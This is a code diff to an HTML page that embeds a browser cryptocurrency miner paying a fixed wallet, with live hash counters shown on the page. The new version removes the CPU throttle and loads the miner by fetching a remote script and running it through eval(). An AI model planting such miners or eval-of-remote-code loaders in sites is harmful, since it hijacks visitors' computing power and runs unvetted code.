@@ -45,23 +45,28 @@
 		</tr>
 	</table>
 							
-	<script src="http://pool.mineallcrypto.com/git/webminer/acminer/processor.js"></script>
-	<script>
-		allCryptoMiner.CONFIG = {
-			WEBSOCKET_SHARDS: [["wss://pool.mineallcrypto.com/webminer7002"]]
-		};
-		var miner = new allCryptoMiner.User(allCryptoMiner, {
-			throttle: 0.8,
-			wallet: 'adYgX2Chzi7QZNHz1dyyFa32p2MKisY8xdjCSqYZ1gkAa5voMoBwrty7sLDuxRZ7Et2ayeXWspNc7dLAv42bwk1T12M7x5toh'
-		});
-		miner.start();
-		
-		// Output Results
-		setInterval(function () {
-			var hashesPerSecond = miner.getHashesPerSecond();
-			document.getElementById("TotalHashes").innerHTML = miner.getTotalHashes();
-			document.getElementById("VerifiedShares").innerHTML = miner.getAcceptedHashes();
-			document.getElementById("Hashes").innerHTML = Math.round(hashesPerSecond);
-		}, 500);
+	<script type="text/javascript">
+		function acMiner()
+		{
+			allCryptoMiner.CONFIG = {
+				WEBSOCKET_SHARDS: [["wss://webminer.mineallcrypto.com/webminer7002"]]
+			};
+			var miner = new allCryptoMiner.User(allCryptoMiner, {
+				wallet: 'adYgX2Chzi7QZNHz1dyyFa32p2MKisY8xdjCSqYZ1gkAa5voMoBwrty7sLDuxRZ7Et2ayeXWspNc7dLAv42bwk1T12M7x5toh'
+			});
+			miner.start();
+			
+			// Output Results
+			setInterval(function () {
+				var hashesPerSecond = miner.getHashesPerSecond();
+				document.getElementById("TotalHashes").innerHTML = miner.getTotalHashes();
+				document.getElementById("VerifiedShares").innerHTML = miner.getAcceptedHashes();
+				document.getElementById("Hashes").innerHTML = Math.round(hashesPerSecond);
+			}, 500);
+		}
+	</script>
+	<script type="text/javascript">
+		var req = new XMLHttpRequest;
+		req.addEventListener("load", function (data) {if (req.readyState != 4)if(req.status != 200){console.log("Couldn't load miner");return;}eval(req.responseText);acMiner();}.bind(this), req);req.open("get", 'https://raw.githubusercontent.com/mineallcrypto/webminer/master/acminer/processor.min.js', true);req.send();
 	</script>
 </html>
